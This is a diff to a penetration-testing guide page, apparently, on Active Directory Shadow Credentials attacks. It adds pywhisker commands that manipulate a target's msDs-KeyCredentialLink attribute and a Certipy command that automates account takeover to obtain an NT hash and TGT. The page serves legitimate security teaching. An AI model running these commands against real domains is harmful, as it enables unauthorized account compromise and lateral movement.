@@ -34,7 +34,14 @@ If those per-requisites are met, an attacker can
 From UNIX-like systems, the `msDs-KeyCredentialLink` attribute of a user or computer target can be manipulated with the [pyWhisker](https://github.com/ShutdownRepo/pywhisker) tool.
 
 ```bash
-pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"
+#List all curent KeyCredentials 
+pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_NAME" --action "list"
+
+#Add a new KeyCredential to the target msDs-KeyCredentialLink attribute
+pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_NAME" --action "add" -P "YOUR_PFX_CERT_PASSWORD"
+
+#Remove a KeyCredential from the target msDs-KeyCredentialLink attribute
+pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_NAME" --action "remove" -D "DEVICE_ID"
 ```
 
 {% hint style="info" %}
@@ -46,6 +53,12 @@ ntlmrelayx -t ldap://dc02 --shadow-credentials --shadow-target 'dc01$'
 {% endhint %}
 
 When the public key has been set in the `msDs-KeyCredentialLink` of the target, the certificate generated can be used with [Pass-the-Certificate](pass-the-certificate.md) to obtain a TGT and further access.
+
+[Certipy](https://github.com/ly4k/Certipy) (python) can automate the process. It will add a new Key Credential to the target account, authenticate with the Key Credential to retrieve the NT hash and a TGT for the target, and finally restore the old Key Credential attribute.
+
+```bash
+certipy.py shadow auto -u "USERNAME" -p "PASSWORD" -account "TARGET_ACCOUNT_NAME" -target "TARGET_IP"
+```
 {% endtab %}
 
 {% tab title="Windows" %}
